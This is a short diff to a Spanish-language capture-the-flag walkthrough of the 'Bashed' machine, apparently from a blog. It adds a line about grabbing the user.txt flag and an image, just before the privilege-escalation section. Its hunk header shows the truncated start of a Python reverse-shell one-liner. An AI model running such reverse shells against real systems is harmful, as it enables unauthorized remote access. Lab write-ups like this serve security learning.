@@ -114,6 +114,10 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ![shell.jpg]({{site.baseurl}}/images/Bashed/shell.jpg)
 
+Ahora podremos agarrar la flag de user.txt
+
+falguser.jpg
+![falguser.jpg]({{site.baseurl}}/images/Bashed/falguser.jpg)
 # PostExplotación
 
 Empezamos con la fase de escalada de privilegios.
